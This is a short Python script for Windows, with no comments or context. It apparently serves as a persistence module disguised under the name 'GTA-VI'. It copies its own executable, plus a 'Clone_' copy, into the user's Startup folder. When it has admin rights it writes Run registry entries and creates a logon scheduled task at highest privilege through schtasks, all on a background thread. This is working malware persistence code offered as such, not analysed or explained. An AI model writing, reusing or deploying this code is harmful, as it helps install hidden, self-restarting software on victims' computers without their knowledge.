import os
import sys
import shutil
import threading
import ctypes
import winreg as reg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup_nonadmin():
    exe_path = sys.executable
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)

    shutil.copy(exe_path, startup_folder)
    shutil.copy(exe_path, os.path.join(startup_folder, "Clone_" + os.path.basename(exe_path)))

def add_to_startup_admin():
    exe_path = sys.executable
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE) as key:
        reg.SetValueEx(key, "GTA-VI", 0, reg.REG_SZ, exe_path)
        reg.SetValueEx(key, "Clone_GTA-VI", 0, reg.REG_SZ, os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Clone_" + os.path.basename(exe_path)))

def add_scheduled_task():
    exe_path = sys.executable
    task_command = f'schtasks /create /sc onlogon /tn "GTA-VI" /tr "{exe_path}" /rl highest /f'
    os.system(task_command)

def setup_startup():
    if is_admin():
        add_to_startup_admin()
        add_scheduled_task()
    else:
        add_to_startup_nonadmin()

def run_setup_in_thread():
    setup_startup()

if __name__ == "__main__":
    thread = threading.Thread(target=run_setup_in_thread)
    thread.start()
